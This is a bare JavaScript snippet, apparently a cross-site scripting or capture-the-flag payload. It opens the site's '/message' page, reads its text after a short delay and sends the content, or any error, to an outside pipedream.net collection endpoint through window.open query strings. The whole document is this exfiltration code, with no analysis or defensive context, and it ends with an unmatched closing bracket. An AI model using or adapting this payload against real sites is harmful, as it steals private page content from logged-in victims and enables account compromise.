const END = "https://eoeipamgnflz15n.m.pipedream.net";

window.open(END + "?start", "skav_debug2");
const DELAY_MS = 1500;
// ouvre /message dans un onglet réutilisable
const w = window.open("/message", "skav_debug");
setTimeout(() => {
  try {
    if (!w) throw new Error("no_window");
    if (w.closed) throw new Error("window_closed");

    const doc = w.document;
    if (!doc) throw new Error("no_document");

    const body = doc.body;
    if (!body) throw new Error("no_body");

    const content = (body.innerText || body.textContent || "").trim();

    if (content.length) {
      window.open(END + "?ok=" + encodeURIComponent(content), "skav_debug");
    } else {
      window.open(END + "?error=" + encodeURIComponent("empty_body"), "skav_debug");
    }
  } catch (err) {
    window.open(END + "?error=" + encodeURIComponent(String(err)), "skav_debug");
  }
}, DELAY_MS);
})();
